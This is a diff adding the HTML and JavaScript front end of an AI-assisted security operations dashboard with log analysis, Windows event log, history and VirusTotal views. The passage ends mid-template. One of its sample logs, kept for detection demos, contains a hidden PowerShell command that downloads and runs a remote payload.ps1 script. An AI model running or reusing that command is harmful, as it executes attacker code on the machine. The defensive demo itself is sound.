@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Cyber AI SOC Dashboard</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <style>
+    :root {
+      --soc-blue: #0d6efd;
+      --soc-blue-light: #e7f0ff;
+      --soc-red: #dc3545;
+      --soc-orange: #fd7e14;
+      --soc-yellow: #ffc107;
+      --soc-green: #198754;
+      --soc-teal: #0dcaf0;
+      --soc-sidebar: #f8f9fa;
+      --soc-border: #dee2e6;
+      --soc-card-shadow: 0 1px 4px rgba(0,0,0,.07);
+    }
+
+    body { background: #f1f3f6; font-family: 'Segoe UI', system-ui, sans-serif; font-size: .9rem; }
+
+    /* ── Navbar ── */
+    .soc-navbar {
+      background: #fff;
+      border-bottom: 2px solid var(--soc-blue);
+      padding: .6rem 1.5rem;
+      position: sticky; top: 0; z-index: 1030;
+      box-shadow: 0 2px 8px rgba(13,110,253,.08);
+    }
+    .soc-navbar .brand { font-weight: 700; font-size: 1.15rem; color: var(--soc-blue); letter-spacing: .02em; }
+    .soc-navbar .brand i { margin-right: .35rem; }
+    .status-pill {
+      display: inline-flex; align-items: center; gap: .4rem;
+      background: #d1e7dd; color: #0a3622; border-radius: 50px;
+      padding: .25rem .75rem; font-size: .78rem; font-weight: 600;
+    }
+    .status-pill .dot {
+      width: 8px; height: 8px; border-radius: 50%; background: var(--soc-green);
+      animation: blink 2s ease-in-out infinite;
+    }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
+
+    /* ── Sidebar tabs ── */
+    .soc-sidebar {
+      background: #fff; border-right: 1px solid var(--soc-border);
+      min-height: calc(100vh - 58px); padding: 1rem .5rem;
+    }
+    .soc-sidebar .nav-link {
+      color: #495057; border-radius: 8px; padding: .6rem 1rem;
+      display: flex; align-items: center; gap: .5rem; font-weight: 500;
+      transition: background .15s, color .15s;
+    }
+    .soc-sidebar .nav-link:hover { background: var(--soc-blue-light); color: var(--soc-blue); }
+    .soc-sidebar .nav-link.active { background: var(--soc-blue); color: #fff; }
+    .soc-sidebar .nav-link i { font-size: 1rem; }
+
+    /* ── Cards ── */
+    .soc-card {
+      background: #fff; border: 1px solid var(--soc-border);
+      border-radius: 10px; box-shadow: var(--soc-card-shadow);
+    }
+    .soc-card .card-header {
+      background: #f8f9fa; border-bottom: 1px solid var(--soc-border);
+      border-radius: 10px 10px 0 0; padding: .6rem 1rem;
+      font-size: .78rem; font-weight: 700; text-transform: uppercase;
+      letter-spacing: .07em; color: #6c757d;
+    }
+    .stat-card {
+      border-radius: 10px; padding: 1rem 1.25rem;
+      display: flex; align-items: center; gap: 1rem;
+      box-shadow: var(--soc-card-shadow);
+    }
+    .stat-card .stat-icon {
+      width: 46px; height: 46px; border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.3rem;
+    }
+    .stat-card .stat-val { font-size: 1.5rem; font-weight: 700; line-height: 1; }
+    .stat-card .stat-lbl { font-size: .75rem; color: #6c757d; margin-top: .15rem; }
+
+    /* ── Textarea ── */
+    #logInput {
+      font-family: 'Cascadia Code', Consolas, monospace; font-size: .82rem;
+      min-height: 130px; resize: vertical;
+      border: 1.5px solid var(--soc-border); border-radius: 8px;
+      background: #fafbfc; transition: border-color .2s;
+    }
+    #logInput:focus { border-color: var(--soc-blue); box-shadow: 0 0 0 .15rem rgba(13,110,253,.12); }
+
+    /* ── Risk badges ── */
+    .badge-risk-critical { background: #dc3545; color:#fff; }
+    .badge-risk-high     { background: #fd7e14; color:#fff; }
+    .badge-risk-medium   { background: #ffc107; color:#212529; }
+    .badge-risk-low      { background: #198754; color:#fff; }
+    .badge-risk-unknown  { background: #6c757d; color:#fff; }
+
+    /* ── Severity badges (event log) ── */
+    .sev-Critical    { background:#f8d7da; color:#842029; }
+    .sev-Error       { background:#f8d7da; color:#842029; }
+    .sev-Warning     { background:#fff3cd; color:#664d03; }
+    .sev-Information { background:#d1e7dd; color:#0a3622; }
+    .sev-Verbose     { background:#e2e3e5; color:#41464b; }
+
+    /* ── Loader ── */
+    #loader { display:none; }
+    #loader.show { display:flex; align-items:center; gap:.5rem; color:var(--soc-blue); }
+
+    /* ── Log table ── */
+    .log-table th { background:#f8f9fa; font-size:.75rem; font-weight:700;
+      text-transform:uppercase; letter-spacing:.06em; white-space:nowrap; }
+    .log-table td { font-size:.82rem; vertical-align:middle; }
+    .log-table tbody tr:hover { background:#f0f4ff; }
+    .msg-cell { max-width:340px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; cursor:pointer; }
+    .msg-cell:hover { white-space:normal; overflow:visible; }
+
+    /* ── Result panel ── */
+    #resultPanel { display:none; }
+    .result-header { border-left:4px solid var(--soc-blue); padding-left:.75rem; }
+    .result-header.risk-Critical { border-color:var(--soc-red); }
+    .result-header.risk-High     { border-color:var(--soc-orange); }
+    .result-header.risk-Medium   { border-color:var(--soc-yellow); }
+    .result-header.risk-Low      { border-color:var(--soc-green); }
+
+    /* ── MITRE table ── */
+    .mitre-tag {
+      display:inline-block; background:#e7f0ff; color:var(--soc-blue);
+      border-radius:4px; font-size:.75rem; font-weight:600;
+      padding:.1rem .45rem; margin:.1rem;
+    }
+
+    /* ── IOC chip ── */
+    .ioc-chip {
+      display:inline-block; background:#f1f3f6; border:1px solid var(--soc-border);
+      border-radius:4px; font-size:.74rem; font-family:monospace;
+      padding:.1rem .4rem; margin:.1rem; word-break:break-all;
+    }
+
+    /* ── Log fetch controls ── */
+    .log-controls { background:#fff; border:1px solid var(--soc-border); border-radius:10px; padding:1rem; }
+    .log-controls label { font-size:.8rem; font-weight:600; color:#495057; }
+
+    /* ── Section tabs ── */
+    .tab-section { display:none; }
+    .tab-section.active { display:block; }
+
+    /* ── Responsive ── */
+    @media(max-width:768px){
+      .soc-sidebar{ display:none; }
+      .stat-card .stat-val{ font-size:1.2rem; }
+    }
+
+    /* ── Timeline ── */
+    .timeline-item { border-left:3px solid var(--soc-border); padding-left:1rem; margin-bottom:1rem; position:relative; }
+    .timeline-item::before { content:''; position:absolute; left:-6px; top:4px;
+      width:10px; height:10px; border-radius:50%; background:var(--soc-blue); border:2px solid #fff; }
+    .timeline-item.risk-Critical::before { background:var(--soc-red); }
+    .timeline-item.risk-High::before     { background:var(--soc-orange); }
+
+    /* ── Confidence bar ── */
+    .conf-bar { height:6px; border-radius:3px; background:#e9ecef; }
+    .conf-bar-fill { height:100%; border-radius:3px; background:var(--soc-blue); transition:width .4s; }
+  </style>
+</head>
+<body>
+
+<!-- ════════════════════ NAVBAR ════════════════════ -->
+<nav class="soc-navbar d-flex align-items-center justify-content-between">
+  <div class="d-flex align-items-center gap-3">
+    <span class="brand"><i class="bi bi-shield-shaded"></i>Cyber AI SOC</span>
+    <span class="d-none d-md-inline text-muted" style="font-size:.78rem;">v2.0 | AI-Powered Threat Analysis</span>
+  </div>
+  <div class="d-flex align-items-center gap-2">
+    <span class="status-pill"><span class="dot"></span>System Online</span>
+    <span id="navClock" class="d-none d-md-inline text-muted ms-2" style="font-size:.78rem;font-family:monospace;"></span>
+  </div>
+</nav>
+
+<div class="container-fluid">
+  <div class="row g-0">
+
+    <!-- ════════════════════ SIDEBAR ════════════════════ -->
+    <div class="col-md-2 col-lg-2 soc-sidebar">
+      <div class="nav flex-column gap-1">
+        <button class="nav-link active" onclick="showTab('dashboard')">
+          <i class="bi bi-grid-1x2-fill"></i> Dashboard
+        </button>
+        <button class="nav-link" onclick="showTab('analyze')">
+          <i class="bi bi-search"></i> Analyze Log
+        </button>
+        <button class="nav-link" onclick="showTab('windows')">
+          <i class="bi bi-windows"></i> Windows Logs
+        </button>
+        <button class="nav-link" onclick="showTab('history')">
+          <i class="bi bi-clock-history"></i> History
+        </button>
+        <hr>
+        <a class="nav-link" href="/api/docs" target="_blank">
+          <i class="bi bi-code-square"></i> API Docs
+        </a>
+      </div>
+    </div>
+
+    <!-- ════════════════════ MAIN CONTENT ════════════════════ -->
+    <div class="col-md-10 col-lg-10 p-3">
+
+      <!-- ── MOBILE NAV ── -->
+      <div class="d-md-none mb-3 d-flex gap-2 flex-wrap">
+        <button class="btn btn-sm btn-outline-primary" onclick="showTab('dashboard')"><i class="bi bi-grid-1x2-fill"></i></button>
+        <button class="btn btn-sm btn-outline-primary" onclick="showTab('analyze')"><i class="bi bi-search"></i></button>
+        <button class="btn btn-sm btn-outline-primary" onclick="showTab('windows')"><i class="bi bi-windows"></i></button>
+        <button class="btn btn-sm btn-outline-primary" onclick="showTab('history')"><i class="bi bi-clock-history"></i></button>
+      </div>
+
+      <!-- ══════════ TAB: DASHBOARD ══════════ -->
+      <div id="tab-dashboard" class="tab-section active">
+        <div class="d-flex align-items-center justify-content-between mb-3">
+          <h5 class="fw-bold mb-0"><i class="bi bi-grid-1x2-fill text-primary me-2"></i>Dashboard Overview</h5>
+          <button class="btn btn-sm btn-outline-primary" onclick="refreshDashboard()">
+            <i class="bi bi-arrow-clockwise"></i> Refresh
+          </button>
+        </div>
+
+        <!-- Stat cards -->
+        <div class="row g-3 mb-4">
+          <div class="col-6 col-lg-3">
+            <div class="stat-card" style="background:#fff;border:1px solid #dee2e6;">
+              <div class="stat-icon" style="background:#e7f0ff;color:#0d6efd;"><i class="bi bi-activity"></i></div>
+              <div>
+                <div class="stat-val" id="statTotal">—</div>
+                <div class="stat-lbl">Total Analyses</div>
+              </div>
+            </div>
+          </div>
+          <div class="col-6 col-lg-3">
+            <div class="stat-card" style="background:#fff;border:1px solid #dee2e6;">
+              <div class="stat-icon" style="background:#f8d7da;color:#dc3545;"><i class="bi bi-exclamation-triangle-fill"></i></div>
+              <div>
+                <div class="stat-val" id="statHigh">—</div>
+                <div class="stat-lbl">High / Critical</div>
+              </div>
+            </div>
+          </div>
+          <div class="col-6 col-lg-3">
+            <div class="stat-card" style="background:#fff;border:1px solid #dee2e6;">
+              <div class="stat-icon" style="background:#d1e7dd;color:#198754;"><i class="bi bi-shield-check"></i></div>
+              <div>
+                <div class="stat-val" id="statLow">—</div>
+                <div class="stat-lbl">Low / Medium</div>
+              </div>
+            </div>
+          </div>
+          <div class="col-6 col-lg-3">
+            <div class="stat-card" style="background:#fff;border:1px solid #dee2e6;">
+              <div class="stat-icon" style="background:#fff3cd;color:#664d03;"><i class="bi bi-cpu"></i></div>
+              <div>
+                <div class="stat-val" id="statAvgConf">—</div>
+                <div class="stat-lbl">Avg Confidence</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Recent activity timeline -->
+        <div class="soc-card mb-3">
+          <div class="card-header"><i class="bi bi-clock me-1"></i>Recent Activity</div>
+          <div class="p-3" id="dashTimeline">
+            <p class="text-muted text-center small my-3">No activity yet. Analyze a log to get started.</p>
+          </div>
+        </div>
+
+        <!-- Latest analysis details -->
+        <div class="soc-card mb-3">
+          <div class="card-header"><i class="bi bi-cpu me-1"></i>Latest AI Analysis</div>
+          <div class="p-3" id="dashLatest">
+            <p class="text-muted text-center small my-3">Run an analysis to see full details and AI recommendations here.</p>
+          </div>
+        </div>
+
+        <!-- Quick actions -->
+        <div class="row g-3">
+          <div class="col-md-6">
+            <div class="soc-card h-100">
+              <div class="card-header"><i class="bi bi-lightning me-1"></i>Quick Actions</div>
+              <div class="p-3 d-flex flex-column gap-2">
+                <button class="btn btn-primary btn-sm" onclick="showTab('analyze')"><i class="bi bi-search me-1"></i>Analyze New Log</button>
+                <button class="btn btn-outline-secondary btn-sm" onclick="showTab('windows')"><i class="bi bi-windows me-1"></i>Fetch Windows Logs</button>
+              </div>
+            </div>
+          </div>
+          <div class="col-md-6">
+            <div class="soc-card h-100">
+              <div class="card-header"><i class="bi bi-info-circle me-1"></i>System Status</div>
+              <div class="p-3" id="dashHealth">
+                <span class="text-muted small">Loading…</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ══════════ TAB: ANALYZE LOG ══════════ -->
+      <div id="tab-analyze" class="tab-section">
+        <h5 class="fw-bold mb-3"><i class="bi bi-search text-primary me-2"></i>Analyze Security Log</h5>
+        <div class="row g-3">
+          <div class="col-lg-6">
+            <div class="soc-card">
+              <div class="card-header"><i class="bi bi-terminal me-1"></i>Log Input</div>
+              <div class="p-3">
+                <textarea id="logInput" class="form-control mb-2"
+                  placeholder="Paste raw log data here (syslog, Windows Event Log, firewall log, etc.)…"></textarea>
+                <div class="d-flex align-items-center gap-2 flex-wrap">
+                  <button id="analyzeBtn" class="btn btn-primary btn-sm" onclick="analyzeLog()">
+                    <i class="bi bi-shield-exclamation me-1"></i>Analyze
+                  </button>
+                  <button class="btn btn-outline-secondary btn-sm" onclick="loadSample()">
+                    <i class="bi bi-file-text me-1"></i>Load Sample
+                  </button>
+                  <button class="btn btn-outline-danger btn-sm" onclick="clearInput()">
+                    <i class="bi bi-trash me-1"></i>Clear
+                  </button>
+                  <div id="loader" class="ms-2">
+                    <div class="spinner-border spinner-border-sm text-primary" role="status"></div>
+                    <span class="small">Analyzing…</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-6">
+            <div id="resultPanel" class="soc-card">
+              <div class="card-header"><i class="bi bi-clipboard-data me-1"></i>Analysis Result</div>
+              <div class="p-3" id="resultContent"></div>
+            </div>
+            <div id="resultPlaceholder" class="soc-card mt-0">
+              <div class="p-4 text-center text-muted">
+                <i class="bi bi-shield display-4 d-block mb-2 opacity-25"></i>
+                <small>Analysis results will appear here</small>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ══════════ TAB: WINDOWS LOGS ══════════ -->
+      <div id="tab-windows" class="tab-section">
+        <h5 class="fw-bold mb-3"><i class="bi bi-windows text-primary me-2"></i>Windows Event Logs</h5>
+
+        <!-- Controls card -->
+        <div class="log-controls mb-3">
+          <div class="row g-3 align-items-end">
+            <div class="col-sm-4 col-lg-3">
+              <label class="mb-1">Log Count</label>
+              <div class="d-flex gap-1 flex-wrap">
+                <button class="btn btn-sm btn-outline-primary log-preset active" data-val="5" onclick="setPreset(5,this)">Last 5</button>
+                <button class="btn btn-sm btn-outline-primary log-preset" data-val="10" onclick="setPreset(10,this)">Last 10</button>
+                <button class="btn btn-sm btn-outline-primary log-preset" data-val="custom" onclick="setPreset('custom',this)">Custom</button>
+              </div>
+            </div>
+            <div class="col-sm-3 col-lg-2" id="customLimitWrap" style="display:none;">
+              <label class="mb-1">Custom Count (1–200)</label>
+              <input type="number" id="customLimit" class="form-control form-control-sm" min="1" max="200" value="20" />
+            </div>
+            <div class="col-sm-5 col-lg-4">
+              <label class="mb-1">Channels</label>
+              <div class="d-flex gap-2 flex-wrap">
+                <div class="form-check form-check-inline mb-0">
+                  <input class="form-check-input" type="checkbox" id="chkSecurity" value="Security" checked>
+                  <label class="form-check-label small" for="chkSecurity">Security</label>
+                </div>
+                <div class="form-check form-check-inline mb-0">
+                  <input class="form-check-input" type="checkbox" id="chkSystem" value="System" checked>
+                  <label class="form-check-label small" for="chkSystem">System</label>
+                </div>
+                <div class="form-check form-check-inline mb-0">
+                  <input class="form-check-input" type="checkbox" id="chkApplication" value="Application" checked>
+                  <label class="form-check-label small" for="chkApplication">Application</label>
+                </div>
+              </div>
+            </div>
+            <div class="col-sm-12 col-lg-3 d-flex gap-2 align-items-center flex-wrap">
+              <button class="btn btn-primary btn-sm" onclick="fetchWindowsLogs()">
+                <i class="bi bi-arrow-down-circle me-1"></i>Fetch Logs
+              </button>
+              <button class="btn btn-outline-primary btn-sm" id="analyzeWinBtn" onclick="analyzeWindowsLogs()" disabled>
+                <i class="bi bi-shield-exclamation me-1"></i>Analyze Logs
+              </button>
+              <button class="btn btn-outline-secondary btn-sm" id="autoRefreshBtn" onclick="toggleAutoRefresh()">
+                <i class="bi bi-play-circle me-1"></i>Auto-Refresh
+              </button>
+              <div id="winLoader" style="display:none;">
+                <div class="spinner-border spinner-border-sm text-primary" role="status"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Meta info -->
+        <div id="winMeta" class="small text-muted mb-2"></div>
+
+        <!-- Log table -->
+        <div class="soc-card">
+          <div class="card-header d-flex justify-content-between align-items-center">
+            <span><i class="bi bi-table me-1"></i>Event Log Entries</span>
+            <span id="winCount" class="badge bg-secondary">0</span>
+          </div>
+          <div class="table-responsive">
+            <table class="table table-hover log-table mb-0">
+              <thead>
+                <tr>
+                  <th>Timestamp</th>
+                  <th>Event ID</th>
+                  <th>Channel</th>
+                  <th>Source</th>
+                  <th>Severity</th>
+                  <th>Computer</th>
+                  <th>Message</th>
+                </tr>
+              </thead>
+              <tbody id="winLogBody">
+                <tr><td colspan="7" class="text-center text-muted py-4">Click "Fetch Logs" to load Windows Event Logs</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="small text-muted mt-2">
+          <i class="bi bi-info-circle me-1"></i>
+          On Windows: fetches live data via <code>win32evtlog</code>.
+          On other platforms: returns simulated entries for development.
+        </div>
+      </div>
+
+      <!-- ══════════ TAB: HISTORY ══════════ -->
+      <div id="tab-history" class="tab-section">
+        <div class="d-flex align-items-center justify-content-between mb-3">
+          <h5 class="fw-bold mb-0"><i class="bi bi-clock-history text-primary me-2"></i>Analysis History</h5>
+          <button class="btn btn-sm btn-outline-primary" onclick="loadHistory()">
+            <i class="bi bi-arrow-clockwise me-1"></i>Refresh
+          </button>
+        </div>
+        <div class="soc-card">
+          <div class="card-header"><i class="bi bi-list-ul me-1"></i>Past Analyses</div>
+          <div class="table-responsive">
+            <table class="table table-hover log-table mb-0">
+              <thead>
+                <tr>
+                  <th>#</th>
+                  <th>Timestamp</th>
+                  <th>Threat</th>
+                  <th>Risk</th>
+                  <th>Confidence</th>
+                  <th>Log Excerpt</th>
+                  <th>Time (s)</th>
+                </tr>
+              </thead>
+              <tbody id="historyBody">
+                <tr><td colspan="7" class="text-center text-muted py-4">No history yet</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /main col -->
+  </div><!-- /row -->
+</div><!-- /container -->
+
+<!-- ════════════════════ TOAST ════════════════════ -->
+<div class="position-fixed bottom-0 end-0 p-3" style="z-index:9999">
+  <div id="toast" class="toast align-items-center text-bg-primary border-0" role="alert">
+    <div class="d-flex">
+      <div class="toast-body" id="toastMsg"></div>
+      <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
+    </div>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+// ════════════════════════════════════════════════
+// STATE
+// ════════════════════════════════════════════════
+const API = '';
+let logLimit = 5;
+let autoRefreshInterval = null;
+let activeTab = 'dashboard';
+let lastAnalysis = null;
+let lastWinLogData = null;
+
+// ════════════════════════════════════════════════
+// UTILS
+// ════════════════════════════════════════════════
+function toast(msg, variant = 'primary') {
+  const el = document.getElementById('toast');
+  el.className = `toast align-items-center text-bg-${variant} border-0`;
+  document.getElementById('toastMsg').textContent = msg;
+  bootstrap.Toast.getOrCreateInstance(el, { delay: 3000 }).show();
+}
+
+function riskBadge(risk) {
+  const r = (risk || 'unknown').toLowerCase();
+  const cls = { critical:'badge-risk-critical', high:'badge-risk-high', medium:'badge-risk-medium', low:'badge-risk-low' }[r] || 'badge-risk-unknown';
+  return `<span class="badge ${cls} text-uppercase" style="font-size:.7rem;">${risk || 'Unknown'}</span>`;
+}
+
+function sevBadge(sev) {
+  const cls = `sev-${sev || 'Information'}`;
+  return `<span class="badge ${cls} rounded-pill">${sev || 'Info'}</span>`;
+}
+
+function fmtTs(ts) {
+  if (!ts) return '—';
+  try { return new Date(ts).toLocaleString(); } catch { return ts; }
+}
+
+function shortTs(ts) {
+  if (!ts) return '—';
+  try { return new Date(ts).toLocaleTimeString(); } catch { return ts; }
+}
+
+function escHtml(str) {
+  return String(str || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// ════════════════════════════════════════════════
+// CLOCK
+// ════════════════════════════════════════════════
+function updateClock() {
+  document.getElementById('navClock').textContent = new Date().toUTCString().replace(' GMT','Z');
+}
+setInterval(updateClock, 1000);
+updateClock();
+
+// ════════════════════════════════════════════════
+// TAB NAVIGATION
+// ════════════════════════════════════════════════
+function showTab(name) {
+  document.querySelectorAll('.tab-section').forEach(el => el.classList.remove('active'));
+  document.querySelectorAll('.soc-sidebar .nav-link').forEach(el => el.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  const btn = document.querySelector(`.soc-sidebar .nav-link[onclick="showTab('${name}')"]`);
+  if (btn) btn.classList.add('active');
+  activeTab = name;
+
+  if (name === 'dashboard') refreshDashboard();
+  if (name === 'history') loadHistory();
+}
+
+// ════════════════════════════════════════════════
+// DASHBOARD
+// ════════════════════════════════════════════════
+async function refreshDashboard() {
+  // Health check
+  try {
+    const h = await fetch(`${API}/health`).then(r => r.json());
+    const vtStatus = h.vt_configured
+      ? '<span class="badge bg-success">Configured</span>'
+      : '<span class="badge bg-warning text-dark">Not set</span>';
+    const llmStatus = h.llm_configured
+      ? '<span class="badge bg-success">Configured</span>'
+      : '<span class="badge bg-warning text-dark">Not set</span>';
+    document.getElementById('dashHealth').innerHTML = `
+      <div class="d-flex flex-column gap-1 small">
+        <div class="d-flex justify-content-between"><span>App Status</span><span class="badge bg-success">${h.status}</span></div>
+        <div class="d-flex justify-content-between"><span>VirusTotal</span>${vtStatus}</div>
+        <div class="d-flex justify-content-between"><span>LLM (Ollama)</span>${llmStatus}</div>
+      </div>`;
+  } catch { document.getElementById('dashHealth').innerHTML = '<span class="text-danger small">API unreachable</span>'; }
+
+  // History stats
+  try {
+    const data = await fetch(`${API}/history`).then(r => r.json());
+    const hist = data.history || [];
+    const total = hist.length;
+    const high = hist.filter(h => ['high','critical'].includes((h.risk||'').toLowerCase())).length;
+    const low = total - high;
+    const avgConf = total ? Math.round(hist.reduce((s,h) => s + (h.confidence||0), 0) / total) : 0;
+
+    document.getElementById('statTotal').textContent = total;
+    document.getElementById('statHigh').textContent = high;
+    document.getElementById('statLow').textContent = low;
+    document.getElementById('statAvgConf').textContent = total ? `${avgConf}%` : '--';
+
+    const timeline = document.getElementById('dashTimeline');
+    if (!hist.length) {
+      timeline.innerHTML = '<p class="text-muted text-center small my-3">No activity yet.</p>';
+      renderDashboardLatest(lastAnalysis);
+      return;
+    }
+    timeline.innerHTML = hist.slice(0,5).map(h => `
+      <div class="timeline-item risk-${h.risk || ''}">
+        <div class="d-flex justify-content-between align-items-start">
+          <div>
+            <span class="fw-semibold small">${escHtml(h.threat || 'Unknown')}</span>
+            ${riskBadge(h.risk)}
+          </div>
+          <small class="text-muted">${shortTs(h.timestamp)}</small>
+        </div>
+        <div class="text-muted small mt-1 text-truncate" style="max-width:400px;">${escHtml(h.log_excerpt||'')}</div>
+      </div>`).join('');
+    renderDashboardLatest(hist[0]);
+  } catch (e) {
+    console.error(e);
+    renderDashboardLatest(lastAnalysis);
+  }
+}
+
+// ════════════════════════════════════════════════
+// ANALYZE LOG
+// ════════════════════════════════════════════════
+const SAMPLES = [
+  `2024-01-15 03:12:44 sshd[1234]: Failed password for root from 192.168.1.105 port 52841 ssh2
+2024-01-15 03:12:46 sshd[1234]: Failed password for root from 192.168.1.105 port 52842 ssh2
+2024-01-15 03:12:48 sshd[1234]: Failed password for root from 192.168.1.105 port 52843 ssh2
+2024-01-15 03:12:50 sshd[1234]: Failed password for admin from 192.168.1.105 port 52844 ssh2
+2024-01-15 03:12:52 sshd[1234]: Failed password for admin from 192.168.1.105 port 52845 ssh2`,
+  `2024-01-15 14:22:10 Event 4688: Process Created - powershell.exe
+CommandLine: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.47/payload.ps1')
+ParentProcess: cmd.exe User: DOMAIN\\user01 Computer: WORKSTATION-03`,
+  `2024-01-15 22:05:31 FW-EDGE: OUTBOUND BLOCKED 10.0.0.52 -> 185.220.101.47:443 bytes=157286400
+2024-01-15 22:05:32 DLP-ALERT: Large file transfer detected - 150MB sent to external IP
+2024-01-15 22:05:33 SIEM: Data exfiltration indicator - unusual outbound volume`
+];
+let sampleIdx = 0;
+
+function loadSample() {
+  document.getElementById('logInput').value = SAMPLES[sampleIdx % SAMPLES.length];
+  sampleIdx++;
+  toast('Sample log loaded', 'info');
+}
+
+function clearInput() {
+  document.getElementById('logInput').value = '';
+  document.getElementById('resultPanel').style.display = 'none';
+  document.getElementById('resultPlaceholder').style.display = '';
+}
+
+async function analyzeLog() {
+  const log = document.getElementById('logInput').value.trim();
+  if (!log) { toast('Please enter log data', 'warning'); return; }
+
+  document.getElementById('analyzeBtn').disabled = true;
+  document.getElementById('loader').classList.add('show');
+  document.getElementById('resultPanel').style.display = 'none';
+  document.getElementById('resultPlaceholder').style.display = 'none';
+
+  try {
+    const res = await fetch(`${API}/analyze`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ log })
+    });
+    if (!res.ok) {
+      const err = await res.json();
+      throw new Error(err.detail || 'Analysis failed');
+    }
+    const data = await res.json();
+    renderResult(data);
+    lastAnalysis = data;
+    renderDashboardLatest(data);
+    showTab('dashboard');
+    toast('Analysis complete', 'success');
+  } catch (e) {
+    toast('Error: ' + e.message, 'danger');
+    document.getElementById('resultPlaceholder').style.display = '';
+  } finally {
+    document.getElementById('analyzeBtn').disabled = false;
+    document.getElementById('loader').classList.remove('show');
+  }
+}
+
+
+function buildAnalysisHtml(d) {
+  const iocs = d.indicators_found || {};
+  const allIocs = [...(iocs.ips||[]), ...(iocs.urls||[]), ...(iocs.hashes||[]), ...(iocs.domains||[])];
+  const mitre = d.mitre_mapping || (d.mitre_tactic ? [{ tactic: d.mitre_tactic, technique: d.mitre_technique, threat: d.threat }] : []);
+  const threats = d.threats || [];
+  const fallbackIocs = Array.isArray(d.iocs_list)
+    ? d.iocs_list.filter(Boolean)
+    : (Array.isArray(d.iocs) ? d.iocs.filter(Boolean) : []);
+
+  return `
+    <div class="result-header risk-${d.risk || ''} mb-3">
+      <div class="d-flex align-items-center gap-2 flex-wrap">
+        <span class="fw-bold fs-6">${escHtml(d.threat || 'Unknown')}</span>
+        ${riskBadge(d.risk)}
+        <span class="badge bg-light text-dark border">${d.confidence || 0}% confidence</span>
+        <span class="ms-auto text-muted small">${d.processing_time_s || 0}s</span>
+      </div>
+      <div class="conf-bar mt-2">
+        <div class="conf-bar-fill" style="width:${d.confidence||0}%;"></div>
+      </div>
+    </div>
+
+    ${d.attack_type ? `<div class="small text-muted mb-2"><i class="bi bi-bullseye me-1"></i>Attack Type: <strong>${escHtml(d.attack_type)}</strong></div>` : ''}
+    ${threats.length ? `<div class="mb-2">${threats.map(t => `<span class="badge bg-danger me-1 mb-1">${escHtml(t)}</span>`).join('')}</div>` : ''}
+    ${d.summary ? `<div class="alert alert-light border small mb-2 py-2">${escHtml(d.summary)}</div>` : ''}
+    ${d.reason  ? `<div class="small text-muted mb-2"><i class="bi bi-info-circle me-1"></i>${escHtml(d.reason)}</div>` : ''}
+
+    ${d.action ? `
+    <div class="soc-card mb-2">
+      <div class="card-header"><i class="bi bi-shield-exclamation me-1"></i>AI Recommendations</div>
+      <div class="p-2 small" style="white-space:pre-wrap;">${escHtml(d.action)}</div>
+    </div>` : ''}
+
+    ${mitre.length ? `
+    <div class="soc-card mb-2">
+      <div class="card-header"><i class="bi bi-diagram-3 me-1"></i>MITRE ATT&CK</div>
+      <div class="p-2">
+        ${mitre.map(m => `
+          <div class="d-flex gap-2 align-items-start mb-1 flex-wrap">
+            ${m.technique ? `<span class="mitre-tag">${escHtml(m.technique.split(' ')[0])}</span>` : ''}
+            <span class="small text-muted">${escHtml(m.tactic||'')} - ${escHtml(m.threat||'')}</span>
+          </div>`).join('')}
+      </div>
+    </div>` : ''}
+
+    ${allIocs.length ? `
+    <div class="soc-card mb-2">
+      <div class="card-header"><i class="bi bi-bug me-1"></i>IOCs Found (${allIocs.length})</div>
+      <div class="p-2">
+        ${iocs.ips && iocs.ips.length ? `<div class="mb-1"><span class="badge bg-danger me-1">IPs</span>${iocs.ips.map(i=>`<span class="ioc-chip">${escHtml(i)}</span>`).join('')}</div>` : ''}
+        ${iocs.domains && iocs.domains.length ? `<div class="mb-1"><span class="badge bg-warning text-dark me-1">Domains</span>${iocs.domains.map(i=>`<span class="ioc-chip">${escHtml(i)}</span>`).join('')}</div>` : ''}
+        ${iocs.urls && iocs.urls.length ? `<div class="mb-1"><span class="badge bg-secondary me-1">URLs</span>${iocs.urls.map(i=>`<span class="ioc-chip">${escHtml(i)}</span>`).join('')}</div>` : ''}
+        ${iocs.hashes && iocs.hashes.length ? `<div class="mb-1"><span class="badge bg-dark me-1">Hashes</span>${iocs.hashes.map(i=>`<span class="ioc-chip">${escHtml(i)}</span>`).join('')}</div>` : ''}
+      </div>
+    </div>` : ''}
+
+    ${!allIocs.length && fallbackIocs.length ? `
+    <div class="soc-card mb-2">
+      <div class="card-header"><i class="bi bi-bug me-1"></i>IOCs (${fallbackIocs.length})</div>
+      <div class="p-2">
+        ${fallbackIocs.map(i=>`<span class="ioc-chip">${escHtml(i)}</span>`).join('')}
+      </div>
+    </div>` : ''}
+
+    ${d.vt_results && d.vt_results.length ? `
+    <div class="soc-card">
+      <div class="card-header"><i class="bi bi-virus me-1"></i>VirusTotal Results</div>
